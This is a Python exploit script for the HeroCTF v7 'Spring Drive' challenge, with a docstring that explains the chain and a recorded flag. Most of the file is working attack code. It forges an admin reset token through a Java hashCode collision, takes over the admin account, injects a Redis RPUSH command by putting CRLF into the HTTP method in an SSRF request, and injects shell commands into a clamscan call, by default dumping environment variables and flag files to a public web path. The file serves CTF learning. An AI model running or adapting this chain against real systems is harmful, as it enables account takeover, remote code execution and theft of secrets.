#!/usr/bin/env python3
"""
Spring Drive CTF Challenge - RCE Exploit
HeroCTF v7

Flag: Hero{8be9845ab07c17c7f0c503feb0d91184}

Vulnerability Chain:
1. Password reset token forgery via hash collision:
   - ResetPasswordToken.equals() only compares UUID prefix AND hashCode
   - hashCode = token.hashCode() + email.hashCode()
   - Register with email that has: email.hash = admin@example.com.hash - (userId - 1)
   - This compensates for token hash diff when changing |userId to |1

2. SSRF via remote-upload with HTTP method injection to Redis:
   - OkHttp 4.12.0 does NOT validate control characters in HTTP method
   - Using method "RPUSH clamav_queue payload\r\n" sends Redis command
   - The \r\n terminates the command cleanly before HTTP junk
   - Redis executes RPUSH before seeing Host: header (which triggers security abort)

3. Command injection in ClamAVService.isFileClean():
   - clamscan --quiet 'FILEPATH' executed via /bin/sh -c
   - Inject: '; COMMAND # to break out and execute arbitrary commands
   - ClamAV service runs every 60 seconds via @Scheduled annotation

Usage:
    python3 solve.py [TARGET_URL] [COMMAND]

Examples:
    python3 solve.py http://target:port
    python3 solve.py http://target:port "cat /app/flag*.txt > /usr/share/nginx/html/flag.txt"
    python3 solve.py http://target:port "env > /usr/share/nginx/html/env.txt"

Author: Mewski
"""

import random
import re
import string
import sys
import time

import requests

# Target configuration
TARGET = "http://dyn01.heroctf.fr:13638"


def random_string(length=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def java_string_hash(s):
    """
    Compute Java's String.hashCode()

    Java implementation:
        public int hashCode() {
            int h = 0;
            for (int i = 0; i < value.length; i++) {
                h = 31 * h + value[i];
            }
            return h;
        }
    """
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    # Convert to signed 32-bit integer (Java's int is signed)
    if h >= 0x80000000:
        h -= 0x100000000
    return h


def find_collision_email(user_id):
    """
    Find an email with hash that creates collision for given user_id.

    Token format: UUID|userId
    Token hash: token.hashCode() + email.hashCode()

    When we forge token from |X to |1:
    - Original: UUID|X  -> hash changes by the difference in "|X" vs "|1"
    - The hash difference is approximately -(userId - 1) for small userIds

    To compensate, we need:
        our_email.hash = admin@example.com.hash - (userId - 1)

    We search for emails like "admin@example.coX" or "admin@example.coXY"
    """
    admin_hash = java_string_hash("admin@example.com")
    target_hash = admin_hash - (user_id - 1)

    # Try single character suffix
    base = "admin@example.co"
    for c in range(32, 127):
        test_email = base + chr(c)
        if java_string_hash(test_email) == target_hash:
            return test_email

    # Try two character suffix if single char doesn't work
    for c1 in range(32, 127):
        for c2 in range(32, 127):
            test_email = base + chr(c1) + chr(c2)
            if java_string_hash(test_email) == target_hash:
                return test_email

    return None


def predict_next_user_id(target):
    """
    Predict next user ID by examining existing reset tokens.

    The /api/auth/email endpoint leaks all password reset tokens,
    which contain the userId in format: UUID|userId
    """
    resp = requests.get(f"{target}/api/auth/email")
    data = resp.json()

    max_id = 1  # Admin is always userId=1
    for line in data.get("data", []):
        match = re.search(r"\|(\d+)", line)
        if match:
            uid = int(match.group(1))
            if uid > max_id:
                max_id = uid

    return max_id + 1


class Exploit:
    def __init__(self, target):
        self.target = target.rstrip("/")
        self.session = requests.Session()
        self.username = f"user_{random_string()}"
        self.password = random_string(16)
        self.admin_email = "admin@example.com"
        self.admin_password = None
        self.email = None

    def register(self, email):
        """Register a new user with the collision email"""
        print(f"[*] Registering user: {self.username} with email: {email}")
        resp = self.session.post(
            f"{self.target}/api/auth/register",
            json={
                "username": self.username,
                "email": email,
                "password": self.password,
                "confirmPassword": self.password,
            },
        )
        data = resp.json()
        if data.get("status") == "success":
            print(f"[+] Registration successful")
            self.email = email
            return True
        print(f"[-] Registration failed: {data}")
        return False

    def logout(self):
        """Logout current session"""
        self.session.get(f"{self.target}/api/auth/logout")

    def login(self, username, password):
        """Login with given credentials"""
        print(f"[*] Logging in as: {username}")
        resp = self.session.post(
            f"{self.target}/api/auth/login",
            json={"username": username, "password": password},
        )
        data = resp.json()
        if data.get("status") == "success":
            print(f"[+] Login successful")
            return True
        print(f"[-] Login failed: {data}")
        return False

    def get_profile(self):
        """Get current user's profile"""
        resp = self.session.get(f"{self.target}/api/user/profile")
        return resp.json()

    def request_password_reset(self, email):
        """Request a password reset token for given email"""
        print(f"[*] Requesting password reset for: {email}")
        resp = self.session.post(
            f"{self.target}/api/auth/send-password-reset", json={"email": email}
        )
        return resp.json()

    def get_emails(self):
        """Get all password reset emails (tokens are leaked here)"""
        resp = self.session.get(f"{self.target}/api/auth/email")
        return resp.json()

    def reset_password(self, email, token, new_password):
        """Reset password using a token"""
        print(f"[*] Resetting password for {email}")
        resp = self.session.post(
            f"{self.target}/api/auth/reset-password",
            json={"email": email, "token": token, "password": new_password},
        )
        return resp.json()

    def forge_admin_token(self):
        """
        Forge an admin password reset token.

        1. Request password reset for our collision email
        2. Extract the token from leaked emails
        3. Change |userId to |1 to target admin

        The hash collision in our email compensates for the token hash change.
        """
        result = self.request_password_reset(self.email)
        if result.get("status") != "success":
            print(f"[-] Password reset request failed: {result}")
            return None

        emails = self.get_emails()
        if emails.get("status") != "success":
            print("[-] Failed to get emails")
            return None

        # Find our token in the leaked emails
        for line in reversed(emails.get("data", [])):
            if self.email in line:
                match = re.search(r"token=([^,\]]+)", line)
                if match:
                    token = match.group(1)
                    # Forge: change |userId to |1
                    forged = token.rsplit("|", 1)[0] + "|1"
                    print(f"[+] Original token: {token}")
                    print(f"[+] Forged token:   {forged}")
                    return forged

        print("[-] Could not find reset token")
        return None

    def takeover_admin(self):
        """Take over admin account using forged token"""
        forged_token = self.forge_admin_token()
        if not forged_token:
            return False

        self.admin_password = random_string(16)
        result = self.reset_password(
            self.admin_email, forged_token, self.admin_password
        )

        if result.get("status") == "success":
            print(f"[+] Admin password changed to: {self.admin_password}")
            return True

        print(f"[-] Token forgery failed: {result}")
        return False

    def inject_redis_payload(self, command):
        """
        Inject RCE payload via Redis using HTTP method injection.

        OkHttp 4.12.0 sends the HTTP method as the first line without validation:
            METHOD PATH HTTP/1.1\r\n
            Host: hostname\r\n
            ...

        By setting method to "RPUSH clamav_queue payload\r\n", we get:
            RPUSH clamav_queue "payload"\r\n
             /x HTTP/1.1\r\n
            Host: 127.0.0.1:6379\r\n
            ...

        The \r\n terminates our RPUSH command cleanly.

        Redis 7.0+ has Cross Protocol Scripting protection that aborts
        when it sees "Host:", but commands BEFORE that are still executed!

        The payload is added to clamav_queue and processed by ClamAV cron.
        """
        # Command injection payload for clamscan
        # clamscan --quiet 'PAYLOAD' -> clamscan --quiet ''; COMMAND #'
        malicious_path = f"'; {command} #"

        # HTTP method = RPUSH command with CRLF to terminate cleanly
        method = f'RPUSH clamav_queue "{malicious_path}"\r\n'

        print(f"[*] Injecting payload: {malicious_path}")
        print(f"[*] HTTP method: {method!r}")

        resp = self.session.post(
            f"{self.target}/api/file/remote-upload",
            json={
                "url": "http://127.0.0.1:6379/x",
                "filename": "test",
                "httpMethod": method,
            },
        )

        # Error is expected (Redis doesn't speak HTTP)
        # But the RPUSH command executes before Redis disconnects
        result = resp.json()
        print(f"[*] SSRF result: {result.get('status')} (error expected)")
        return True

    def run_exploit(self, command, output_file=None):
        """
        Run the complete exploit chain.

        Args:
            command: Shell command to execute
            output_file: Optional filename to check for output
        """
        print("=" * 60)
        print("Spring Drive RCE Exploit - HeroCTF v7")
        print("=" * 60)

        # Step 1: Predict next user ID
        print("\n[Step 1] Predicting next user ID...")
        predicted_id = predict_next_user_id(self.target)
        print(f"[*] Predicted next user ID: {predicted_id}")

        # Step 2: Find collision email
        print("\n[Step 2] Finding hash collision email...")
        collision_email = find_collision_email(predicted_id)
        if not collision_email:
            print(f"[-] Could not find collision email for userId={predicted_id}")
            return False
        print(f"[+] Collision email: {collision_email}")
        print(f"[+] Hash: {java_string_hash(collision_email)}")

        # Step 3: Register with collision email
        print("\n[Step 3] Registering with collision email...")
        if not self.register(collision_email):
            return False

        # Verify user ID
        profile = self.get_profile()
        actual_id = profile.get("data", {}).get("id")
        print(f"[*] Actual user ID: {actual_id}")

        if actual_id != predicted_id:
            print(f"[!] ID mismatch - collision may fail, but trying anyway")

        # Step 4: Take over admin account
        print("\n[Step 4] Taking over admin account...")
        if not self.takeover_admin():
            print("[-] Failed to takeover admin")
            return False

        # Step 5: Login as admin
        print("\n[Step 5] Logging in as admin...")
        self.logout()
        if not self.login("admin", self.admin_password):
            return False

        profile = self.get_profile()
        if profile.get("data", {}).get("id") != 1:
            print("[-] Not logged in as admin!")
            return False

        print("[+] Successfully logged in as admin (userId=1)!")

        # Step 6: Inject RCE payload via Redis
        print("\n[Step 6] Injecting RCE payload via Redis SSRF...")
        print(f"[*] Command: {command}")
        self.inject_redis_payload(command)

        print("\n[+] Payload injected!")
        print("[*] ClamAV cron runs every 60 seconds")

        if output_file:
            print(f"[*] Output file: {self.target}/{output_file}")

        return True


def main():
    target = TARGET
    output_file = None

    # Parse arguments
    if len(sys.argv) >= 2:
        if sys.argv[1].startswith("http"):
            target = sys.argv[1]
        elif sys.argv[1] in ["-h", "--help"]:
            print(__doc__)
            sys.exit(0)

    # Generate unique output filename
    unique = random_string(6)
    output_file = f"out_{unique}.txt"

    # Default commands to try - flag can be in env or in /app/
    if len(sys.argv) >= 3:
        command = sys.argv[2]
    else:
        # Try to get flag from both locations
        command = f"(cat /app/flag*.txt; echo; env | grep FLAG) > /usr/share/nginx/html/{output_file}"

    print(f"[*] Target: {target}")
    print(f"[*] Output: {output_file}")
    print()

    exploit = Exploit(target)

    if exploit.run_exploit(command, output_file):
        print("\n" + "=" * 60)
        print("[+] Exploit complete!")
        print("=" * 60)
        print(f"\n[*] Waiting 70 seconds for ClamAV cron job...")

        for i in range(70, 0, -10):
            print(f"[*] {i} seconds remaining...")
            time.sleep(10)

        print("\n[*] Attempting to retrieve output...")
        resp = requests.get(f"{target}/{output_file}")

        if resp.status_code == 200:
            content = resp.text.strip()
            if content:
                print(f"\n[+] OUTPUT:\n{content}")

                # Extract flag if present
                flag_match = re.search(r"Hero\{[^}]+\}", content)
                if flag_match:
                    print(f"\n[+] FLAG: {flag_match.group(0)}")
            else:
                print(f"[-] File exists but is empty")
                print(f"[*] Try: curl {target}/{output_file}")
        else:
            print(f"[-] Could not retrieve output (status {resp.status_code})")
            print(f"[*] Try manually: curl {target}/{output_file}")

        # Also check common flag locations
        print("\n[*] Checking other potential output files...")
        for f in ["env.txt", "app_txt.txt", "lsapp.txt"]:
            resp = requests.get(f"{target}/{f}")
            if resp.status_code == 200 and resp.text.strip():
                print(f"[+] Found: {target}/{f}")
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
